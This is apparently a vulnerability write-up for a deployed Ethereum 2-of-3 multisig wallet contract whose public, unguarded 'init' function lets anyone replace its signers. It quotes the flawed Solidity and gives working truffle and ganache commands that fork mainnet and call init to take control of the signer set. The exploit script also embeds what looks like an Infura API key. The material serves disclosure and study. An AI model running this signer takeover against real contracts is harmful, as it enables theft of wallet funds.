# Description 

The vulnerable contract was deployed on the [mainnet](https://etherscan.io/address/0x6630f77801e3d8ee4c624a628d0979ab9e7d111b#contracts) and its vulnerability was found by @samczsun and reported on the ETHSecurity Community Telegram channel.

The Smart Contract was designed to act as a 2 out of 3 multisignature wallet, but the function that was assigning the signers was exposed as a public one and without any authorization check, enabling anyone to set the signers of the SimpleWallet.

Before the vulnerable function 'init', we can see the same code in the constructor of WalletSimple and a comment stating that the signers cannot be changed once they are set:

```
  /**
   * Set up a simple multi-sig wallet by specifying the signers allowed to be used on this wallet.
   * 2 signers will be required to send a transaction from this wallet.
   * Note: The sender is NOT automatically added to the list of signers.
   * Signers CANNOT be changed once they are set
   *
   * @param allowedSigners An array of signers on the wallet
   */
  function WalletSimple(address[] allowedSigners) {
    if (allowedSigners.length != 3) {
      // Invalid number of signers
      throw;
    }
    signers = allowedSigners;
  }

    function init(address[] allowedSigners) {
    if (allowedSigners.length != 3) {
      // Invalid number of signers
      throw;
    }
    signers = allowedSigners;
  }
```

The developer's intention was clear, but forgot to either protect the init function or to completely remove it, since the Contract constructor does already what the developer originally intended to do.

# How to exploit on a local environment

```
npm install -g ganache-cli truffle
npm install truffle-contract
# Fork the mainnet locally from block 7899146
ganache-cli -f https://mainnet.infura.io/v3/45aad5d782be4a68904db4fdf74c315c@7899146 --debug
truffle console # on a different terminal
```

Then in the truffle development console run:

```
const abi = [{"constant":false,"inputs":[{"name":"toAddress","type":"address"},{"name":"value","type":"uint256"},{"name":"tokenContractAddress","type":"address"},{"name":"expireTime","type":"uint256"},{"name":"sequenceId","type":"uint256"},{"name":"signature","type":"bytes"}],"name":"sendMultiSigToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"signers","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"forwarderAddress","type":"address"},{"name":"tokenContractAddress","type":"address"}],"name":"flushForwarderTokens","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"toAddress","type":"address"},{"name":"value","type":"uint256"},{"name":"data","type":"bytes"},{"name":"expireTime","type":"uint256"},{"name":"sequenceId","type":"uint256"},{"name":"signature","type":"bytes"}],"name":"sendMultiSig","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"signer","type":"address"}],"name":"isSigner","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"getNextSequenceId","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"createForwarder","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"safeMode","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"allowedSigners","type":"address[]"}],"name":"init","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"activateSafeMode","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"allowedSigners","type":"address[]"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":false,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"},{"indexed":false,"name":"data","type":"bytes"}],"name":"Deposited","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"msgSender","type":"address"}],"name":"SafeModeActivated","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"msgSender","type":"address"},{"indexed":false,"name":"otherSigner","type":"address"},{"indexed":false,"name":"operation","type":"bytes32"},{"indexed":false,"name":"toAddress","type":"address"},{"indexed":false,"name":"value","type":"uint256"},{"indexed":false,"name":"data","type":"bytes"}],"name":"Transacted","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"msgSender","type":"address"},{"indexed":false,"name":"otherSigner","type":"address"},{"indexed":false,"name":"operation","type":"bytes32"},{"indexed":false,"name":"toAddress","type":"address"},{"indexed":false,"name":"value","type":"uint256"},{"indexed":false,"name":"tokenContractAddress","type":"address"}],"name":"TokenTransacted","type":"event"}]

const address = '0x6630f77801e3d8ee4c624a628d0979ab9e7d111b'

var contract = require("truffle-contract");
var c = contract({abi: abi, address: address});
var provider = new web3.providers.HttpProvider("http://localhost:8545");
c.setProvider(provider);
var app;
c.at(address).then(function(instance){app = instance;});

let accounts = await web3.eth.getAccounts()

app.init([accounts[0], accounts[1], accounts[2]], {from: accounts[0]})

app.isSigner.call(accounts[0], {from: accounts[0]})
// true
app.isSigner.call(accounts[1], {from: accounts[0]})
// true
app.isSigner.call(accounts[2], {from: accounts[0]})
// true
```